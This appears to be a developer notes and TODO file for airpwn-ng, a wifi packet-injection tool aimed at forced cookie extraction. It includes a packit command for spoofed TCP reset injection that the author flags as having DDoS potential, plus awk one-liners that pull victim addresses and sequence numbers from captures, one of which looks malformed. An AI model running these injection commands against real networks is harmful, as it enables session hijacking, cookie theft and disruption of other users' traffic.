#################
## Delegations ##
#################

stryngs:
	- Understand main()
	- Fix help menu
	- Fix scapy warning
	- Create cookie logfile for captures
	- airtun-ng ip mask
		- Useful for wide swatch of subnets if needed
	- Work on gzip

Jack64:
	- Comment up lib/airpwn_ng.py (Completed !)
	- Replace packit with a pure scapy implementation for injection (Completed for monitor mode)
	- ????
	- Replace dot11decrypt with pure scapy WEP/WPA decryption of client traffic (LONGSHOT !)
	

######################
### Current Issues ###
######################

## Capability List for airpwn-ng 
	OPEN WIFI:
	## Inject using 1 NIC for sniffing and the other for injection:
		- 1 NIC in monitor mode
		- 1 NIC in managed mode and associated to the wlan
		
	## Inject using 1 NIC for sniffing and injection:
		- 1 NIC in monitor mode
	
	CLOSED WIFI:
	## Inject using 1 NIC for sniffing and the other for injection:
		- 1 NIC in monitor mode
		- 1 NIC in managed mode and associated to the wlan
		- Accomplished via dot11decrypt
		
	## Inject using 1 NIC for sniffing and injection:
	- ?


## AP filter...
	- Need to create the option to target specific Router LANs only
		- A lack of this option creates chaos on a heavily congested channel with multiple Open APs


########################
### Historical Stuff ###
########################
## DS Fields
	- This issue has been fixed, but for historical purposes the below URL is kept
		- https://dalewifisec.wordpress.com/2014/05/17/the-to-ds-and-from-ds-fields/


## Unsolicited packets
- Since we are injecting stuff here, there is no "telling" what the kernel might do.  I'm not a pro at the whole tcp/ip thing, but I came across a snipet a while back that may prove useful for future work.  As a matter of historical reference for myself and to the community perhaps to where they could provide useful input, I will leave it here until I obtain a more clear understanding to whether or not something like this is needed
	- iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
		- Again, this has not been needed; but depending upon the implementation schema for NIC usage, perhaps it will be...


## DDoS Potential 2-way
- Again, this script is tailored for forced cookie extraction, but who is to say it can't be useful for other things?
	- packit -i $3 -R -nnn -a $seqnum -D $svrport -F R -q $acknum -S $vicport -d $svrip -s $vicip -X $vicmac -Y $rtrmac

## Speeding things up
	- The lynchpin in the whole concept of airpwn/airpwn-ng is that speed is key.  It is a race condition after all; if you can beat the destination's response, you can inject.
	- At CarolinaCon11 one of the attendees viewed this script in it's early stages and suggested using awk, and awk alone to do most of the processing.  In his infinite kindness he went ahead and coded it up.  Obviously this needs to be tested and vetted from a milisecond perspective, but it does look and seem "promising".  I never did catch his name, so he shall be referred to as "background" as that was what he referred to himself as.
	## src MAC -- Victim
	vicmac=$(awk '{sub(/SA:/, "", $15); print $15; }' LOG)
	
	## src MAC -- Router LAN MAC
	rtcmac=$(awk '{sub(/DA:/, "", $16); print $16; }' LOG)
	
	## src IP -- Victim
	vicip=$(awk '{split($34, a, "."); printf("%s.%s.%s.%s\n", a[1], a[2], a[3], a[4]) }printf("%s.%s.%s.%s\n", a[1], a[2], a[3], a[4]) }' LOG)
	
	## src port -- Victim
	vicport=$(awk '{split($34, a, "."); printf("%s\n", a[5]) }' LOG)
	
	## dst IP -- Server
	svrip=$(awk '{split($36, a, "."); printf("%s.%s.%s.%s\n", a[1], a[2], a[3], a[4]) }' LOG)
	
	## svr port -- Server
	svrport=$(awk '{split($36, a, "."); printf("%s\n", a[5]) }' LOG)
	
	## sequence number + length
	acknum=$(awk '{split($40, a, ":"); sub(/,/, "", a[2]); print a[2]}' LOG)
	
	## old acknowledgement number
	seqnum=$(awk '{sub(/,/, "", $42); print $42}' LOG)
